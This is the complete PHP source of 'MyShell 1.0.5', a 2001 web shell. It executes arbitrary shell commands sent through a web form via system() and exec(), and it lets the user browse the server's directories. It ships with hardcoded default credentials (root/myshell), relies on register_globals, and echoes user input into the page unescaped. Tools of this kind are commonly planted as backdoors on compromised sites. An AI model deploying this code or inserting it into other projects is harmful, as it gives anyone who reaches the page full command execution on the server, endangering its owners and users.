<?php









$selfSecure = 1;
$shellUser  = "root";
$shellPswd  = "myshell";





$adminEmail = "youremail@yourserver.com";






$fromEmail  = $HTTP_SERVER_VARS["SERVER_ADMIN"];












$dirLimit = "";







$autoErrorTrap = 1;



$termCols     = 80;            
$termRows     = 20;            
$bgColor      = "#000000";     
$bgInputColor = "#333333";     
$outColor     = "#00BB00";     
$textColor    = "#009900";     
$linkColor    = "#00FF00";     



$MyShellVersion = "MyShell 1.0.5 build 20010910";
if($selfSecure){
    if (($PHP_AUTH_USER!=$shellUser)||($PHP_AUTH_PW!=$shellPswd)) {
       Header('WWW-Authenticate: Basic realm="MyShell"');
       Header('HTTP/1.0 401 Unauthorized');
       echo "<html>
         <head>
         <title>MyShell error - Access Denied</title>
         </head>
         <h1>Access denied</h1>
         A warning message have been sended to the administrator
         <hr>
         <em>$MyShellVersion</em>";
       if(isset($PHP_AUTH_USER)){
          $warnMsg ="
 This is $MyShellVersion
 installed on: http://".$HTTP_SERVER_VARS["HTTP_HOST"]."$PHP_SELF
 just to let you know that somebody tryed to access
 the script using wrong username or password:
 
 Date: ".date("Y-m-d H:i:s")."
 IP: ".$HTTP_SERVER_VARS["REMOTE_ADDR"]."
 User Agent: ".$HTTP_SERVER_VARS["HTTP_USER_AGENT"]."
 username used: $PHP_AUTH_USER
 password used: $PHP_AUTH_PW
 
 If this is not the first time it happens,
 please consider either to remove MyShell
 from your system or change it's name or
 directory location on your server.
 
 Regards
 The MyShell dev team
       ";
          mail($adminEmail,"MyShell Warning - Unauthorized Access",$warnMsg,
          "From: $fromEmail\nX-Mailer:$MyShellVersion AutoWarn System");
       }
       exit;
    }
}

if(!$oCols)$oCols=$termCols;
if(!$oRows)$oRows=$termRows;
?>
<html>
<head>
<title>MyShell</title>
<style>
body{
	background-color: <?echo $bgColor ?>;
	font-family : sans-serif;
	font-size : 10px;
	scrollbar-face-color: #666666;
	scrollbar-shadow-color:  <?echo $bgColor ?>;
	scrollbar-highlight-color: #999999;
	scrollbar-3dlight-color:  <?echo $bgColor ?>;
	scrollbar-darkshadow-color:  <?echo $bgColor ?>;
	scrollbar-track-color:  <?echo $bgInputColor ?>;
	scrollbar-arrow-color:  <?echo $textColor ?>;
}
input,select,option{
	background-color: <?echo $bgInputColor ?>;
	color : <?echo $outColor ?>;
	border-style : none;
	font-size : 10px;
}
textarea{
	background-color: <?echo $bgColor ?>;
	color : <?echo $outColor ?>;
	border-style : none;
}
</style>
</head>
<body bgcolor=<?echo $bgColor ?> TEXT=<?echo $textColor ?> LINK=<?echo $linkColor ?> VLINK=<?echo $linkColor ?> onload=document.shell.command.select()>
<?php

if (isset($work_dir)) {
  
  $work_dir = validate_dir($work_dir);
  @chdir($work_dir) or
      ($dirError = "Can't change directory. Permission denied\nSwitching back to $DOCUMENT_ROOT\n");
  $work_dir = exec("pwd");
}
else{
  
  $work_dir = validate_dir($DOCUMENT_ROOT);
  chdir($work_dir);
  $work_dir = exec("pwd");
}


$cdPos = strpos($command,"cd ");
if ((string)$cdPos != "") {
    $cdPos=$cdPos+3;
    $path = substr($command,$cdPos);
    if ($path==".."){
         $work_dir=strrev(substr(strstr(strrev($work_dir), "/"), 1));
         if ($work_dir == "") $work_dir = "/";
    }
    elseif (substr($path,0,1)=="/")$work_dir=$path;
    else $work_dir=$work_dir."/".$path;
    $work_dir = validate_dir($work_dir);
    @chdir($work_dir) or ($dirError = "Can't change directory. Directory does not exist or permission denied");
    $work_dir = exec("pwd");
    $commandBk = $command;
    $command = "";
}
?>

<form name="shell" method="post">
Current working directory: <b>
<?
$work_dir_splitted = explode("/", substr($work_dir, 1));
echo "<a href=\"$PHP_SELF?work_dir=" . urlencode($url) . "/&command=" . urlencode($command) . "\">Root</a>/";
if ($work_dir_splitted[0] == "") {
  $work_dir = "/";  
}
else{
  for ($i = 0; $i < count($work_dir_splitted); $i++) {
    
    $url .= "/".$work_dir_splitted[$i];
    echo "<a href=\"$PHP_SELF?work_dir=" . urlencode($url) . "&command=" . urlencode($command) . "\">$work_dir_splitted[$i]</a>/";
  }
}
?>
</b>
<br>
<textarea cols="<? echo $oCols ?>" rows="<? echo $oRows ?>" readonly>
<?
echo $dirError;
if ($command) {
  if ($stderr) {
    system($command . " 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/output.txt");
  }
  elseif (substr($command,0,3) == "man"){
      exec($command,$man);
      $rows=count($man);
      $codes = ".".chr(8);
      $manual = "";
      for ($i=0;$i<$rows;$i++){
          $manual.=$man[$i]."\n";
      }
      echo ereg_replace($codes,"",$manual);
  }
  else {
    $ok = system($command,$status);
    if($ok==false &&$status && $autoErrorTrap)system($command . " 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/output.txt");
  }
}
if ($commandBk) $command = $commandBk;
?>
</textarea>
<br>
<br>
Command:
<input type="text" name="command" size="80" <? if ($command && $echoCommand) { echo "value=\"$command\"";} ?> > <input name="submit_btn" type="submit" value="Go!">
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<?
if ($autoErrorTrap) echo "Auto error traping enabled";
else echo "<input type=\"checkbox\" name=\"stderr\">stderr-traping ";
?>
<br>Working directory:
<select name="work_dir" onChange="this.form.submit()">
<?

$dir_handle = opendir($work_dir);

while ($dir = readdir($dir_handle)) {
  if (is_dir($dir)) {
    if ($dir == ".") {
      echo "<option value=\"$work_dir\" selected>Current Directory</option>\n";
    } elseif ($dir == "..") {
      
      if (strlen($work_dir) == 1) {
        
      } elseif (strrpos($work_dir, "/") == 0) {
        
      echo "<option value=\"/\">Parent Directory</option>\n";
      } else {
      
      echo "<option value=\"". strrev(substr(strstr(strrev($work_dir), "/"), 1)) ."\">Parent Directory</option>\n";
      }
    } else {
      if ($work_dir == "/") {
        echo "<option value=\"$work_dir$dir\">$dir</option>\n";
      } else {
        echo "<option value=\"$work_dir/$dir\">$dir</option>\n";
      }
    }
  }
}
  closedir($dir_handle);
?>
</select>
&nbsp; | &nbsp;<input type="checkbox" name="echoCommand"<?if($echoCommand)echo " checked"?>>Echo commands
&nbsp; | &nbsp;Cols:<input type="text" name="oCols" size=3 value=<?echo $oCols?>>
&nbsp;Rows:<input type="text" name="oRows" size=2 value=<?echo $oRows?>>
&nbsp;| ::::::::::&nbsp;<a href="http://www.digitart.net" target="_blank" style="text-decoration:none"><b>MyShell</b> &copy;2001 Digitart Producciones</a>
</form>
</body>
</html>
<?
function validate_dir($dir){
    GLOBAL $dirLimit;
    if($dirLimit){
        $cdPos = strpos($dir,$dirLimit);
        if ((string)$cdPos == "") {
            $dir = $dirLimit;
            $GLOBALS["dirError"] = "You are not allowed change to directories above $dirLimit\n";
        }
    }
    return $dir;
}
?>
